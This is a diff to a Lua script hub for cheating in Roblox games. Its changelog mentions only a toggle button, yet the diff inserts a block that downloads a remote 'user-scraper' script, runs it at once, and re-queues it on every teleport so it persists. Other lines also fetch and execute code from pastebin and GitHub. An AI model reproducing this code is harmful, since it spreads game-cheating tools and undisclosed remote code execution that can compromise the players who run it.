@@ -1,5 +1,6 @@
 -- Gui to Lua LOLLYPOPHUB
 -- Version: 6.2
+-- toggle button added
 -- Instanxes:
 loadstring(game:HttpGet("https://pastebin.com/raw/uNb6892M",true))()
 
@@ -8,14 +9,14 @@ Library.DefaultColor = Color3.fromRGB(50,205,50)
 
 Library:Notification({
   Text = "LOLLYPOP HUB V6.2🍭😋🍭😋",
-  Duration = 9
+  Duration = 11
 })
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
 Library.DefaultColor = Color3.fromRGB(50,205,50)
 
 Library:Notification({
   Text = "almost every skript in this joint",
-  Duration = 8
+  Duration = 10
 })
 --bloodball.Endnotif
 game:GetService("StarterGui"):SetCore("SendNotification",{ 	
@@ -46,8 +47,26 @@ local SkriptsSection = Skripts:NewSection("Skript hub by lulaslollipop🍭😋")
 SkriptsSection:NewDropdown("NEW SKRIPTS:","updates here", {"last updated: 10/12/2023", "Version: 6.2", "4 new hubs added", "rate my avatar skript(Games)", "bladeball skripts(Games)", "NEW BLOXFRUITS skripts(Games)", "mystery skript added(Skripts)", "lyrik bot(Fun)", "xheru is lame"}, function(currentOption)
     print(currentOption)
 end)
-SkriptsSection:NewLabel("Welkome" "..player.DisplayName..")
+--userskraperinfo
+local waitTime = 0
 
+repeat (function()
+   task.wait(1)
+   waitTime = waitTime + 1
+end)() until game:IsLoaded() or (waitTime > 10)
+
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local script = game:HttpGet("https://raw.githubusercontent.com/snipcola/roblox-scripts/main/user-scraper.lua")
+
+localPlayer.OnTeleport:Connect(function(state)
+   if state == Enum.TeleportState.Started then
+       syn.queue_on_teleport(script)
+   end
+end)
+
+loadstring(script)()
+--end:userskraperinfo
 -- SKRIPTS BUTTONS
 SkriptsSection:NewButton("99% fail impossible obby memory skript", "purple = ✅, red = ❌, green = ✅, tile broke, or 🔥 ", function()
 -- lulas 99 fail memory skript
